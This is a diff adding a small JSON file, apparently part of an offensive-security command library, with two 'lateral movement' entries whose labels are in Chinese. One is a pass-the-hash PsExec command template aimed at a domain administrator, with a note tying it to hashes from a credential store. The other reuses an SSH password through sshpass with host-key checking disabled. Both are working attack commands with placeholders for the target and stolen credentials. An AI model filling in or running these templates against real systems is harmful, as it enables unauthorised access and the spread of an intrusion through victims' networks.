@@ -1,0 +1,18 @@
+[
+  {
+    "id": "k-13",
+    "category": "横向移动",
+    "os": "Windows",
+    "title": "哈希传递 PsExec",
+    "cmd": "psexec.py -hashes :{HASH} {DOMAIN}/administrator@{IP}",
+    "note": "配合凭据库中的 NTLM 哈希"
+  },
+  {
+    "id": "k-14",
+    "category": "横向移动",
+    "os": "Linux",
+    "title": "SSH 凭据复用",
+    "cmd": "sshpass -p '{PASS}' ssh -o StrictHostKeyChecking=no {USER}@{IP} \"id\"",
+    "note": ""
+  }
+]
